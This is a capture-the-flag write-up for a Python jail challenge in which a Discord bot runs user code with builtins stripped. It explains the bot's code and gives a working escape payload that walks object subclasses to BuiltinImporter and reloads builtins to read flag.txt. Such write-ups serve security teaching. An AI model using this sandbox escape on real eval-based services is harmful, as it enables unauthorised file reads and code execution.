# Keith Bot

>Keith made a Discord bot so he could run commands on the go, but there were some bugs

>DM Keith Bot#3149 (found in the Discord server)

>Note: The flag is in flag.txt

## Problem

This was a nice twist on the classic pyjail problem, taken a bit to the extreme. We got 2 files along with the challenge, ```bot.py``` and ```eval.py```. Essentially, looking at ```bot.py``` we see this interesting line:

```python
bot = commands.Bot(command_prefix=commands.when_mentioned_or("_"))
```
This means the bot will react when we prefix whatever we say to him with either ```_``` or we ```@``` him. Furthermore we see this:

```python
async def on_message(message):
    if message.author == bot.user:  ## (1)
        return

    if message.guild is None:
        await bot.process_commands(message)
    elif bot.user in message.mentions:
        await message.channel.send(f"{message.author.mention} DM me")  ##(2)
 ```
 Basically, the bot will never answer to itself (1) and it will always respond "DM me" if you try to ```@``` him outside of DM mode (2). It will only respond in DMs and will then process the command it is passed. Commands are defined using ```@bot.command(name="cmdnamehere")``` and in our case there is only one:
 
 ```python
 @bot.command(name="eval")
async def _eval(ctx, *, body):
    if body.startswith("```") and body.endswith("```"):
        body = "\n".join(body.split("\n")[1:-1])
    else:
        body = body.strip("` \n")

    process = await asyncio.create_subprocess_exec("env", "-i", "python3", "eval.py", stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)

    try:
        out, err = await asyncio.wait_for(process.communicate(body.encode()), 5)
    except asyncio.TimeoutError:
        await process.kill()
    else:
        if out or err:
            await ctx.send(f"```py\n{out.decode()}{err.decode()}\n```")

```
The interesting line is this one:

```python
process = await asyncio.create_subprocess_exec("env", "-i", "python3", "eval.py", stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
```

This means that the bot will pass whatever you write after ```eval``` as an argument to ```eval.py``` and pipe out the result. Time to take a look at eval then.

## Eval file

Three lines are relevant for us:

```python
env = {"__builtins__": {}}
exec(f"def func():\n{textwrap.indent(sys.stdin.read(), '    ')}", env)
ret = env["func"]()
```
The first one defines a new environment where all builtins are removed. This means no f=more commands like ```open```, ```print```, ```file``` etc. The second one takes ```stdin``` (whatever Keithbot passed as an argument in this case), wraps it in a function and compiles it in the context of our naked ```env``` environment. The third lines then exectutes the function and stores whatever was returned.

Example: assume we send ```_eval return 1```. The created function is:

```python
def func():
  return 1
```
And in fact we get ```1``` back.

So this is basically a python jail, we have no access to builtins, need to write a function body that returns a value and that value will have to be the flag.

## Solving

It took me a little while but being no stranger to pyjails and to flask injections alike, I figured it out. Basically we can access a bunch of classes by using python's OOO structure. For instance doing this:

```python
''.__class__.__mro__[1].__subclasses__()
```
will return a bunch of available subclasses. The trick is to try and find a way to use one of those to access our flag. Sometimes, we'll find the ```file``` class in there but in this case there was none. Another exploit is to go through the ```warnings``` modules but that wasn't in the list (a nice overview of the methods is [here](https://zolmeister.com/2013/05/escaping-python-sandbox.html)).

I spent some time going through the modules and tried a bunch of different things until I found this one (index 80 of ```subclasses```:

```python
<class '_frozen_importlib.BuiltinImporter'>
```

Did someone say Jackpot? Basically after reading up on it, using this class we can use the ```load_module``` method to reimport our original bultins and have access to all the normal functions we would in our normal IDE. At this point it becomes trivial:

```python
_eval return [].__class__.__mro__[1].__subclasses__()[80].load_module('builtins').open('flag.txt').read()
```
This correctly returns our flag.










 
 

